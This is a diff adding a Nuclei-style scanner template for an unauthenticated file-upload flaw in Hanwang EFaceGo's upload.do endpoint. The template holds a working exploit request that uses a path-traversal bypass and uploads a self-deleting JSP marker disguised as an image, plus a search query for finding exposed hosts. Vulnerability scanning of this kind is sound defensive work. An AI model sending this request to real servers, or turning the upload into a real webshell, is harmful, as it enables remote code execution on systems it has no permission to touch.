@@ -1,0 +1,45 @@
+id: hanwang-intercom-fileupload
+info:
+  name: 汉王 EFaceGo upload.do 接口存在文件上传漏洞
+  author: leadlife
+  severity: critical
+  description: 汉王 EFaceGo upload.do 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference: 
+    - https://mp.weixin.qq.com/s/L9DtRgei84Up15Jr3uoFlA
+    - https://github.com/zan8in/afrog/blob/afc4b21468b346fc2e43ca88595a365ff0f4ac15/pocs/temp/afrog-pocs/vulnerability/hanwang-efacego-upload-do-fileupload.yaml#L23
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: icon_hash="1380907357"
+    tips: 手工确认是否上传成功，path is in response
+    repair: 目前官方已发布漏洞修复版本，建议用户升级到安全版本：https://hwzy99.com/
+    version:
+  tags: fileupload,hanwang,efacego
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /manage/intercom/..%3B/..%3B/manage/resourceUpload/upload.do HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Length: 199
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
+        Content-Type: image/jpeg
+
+        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'EFaceGo','resultCode','fileName','createTime')
+        condition: and
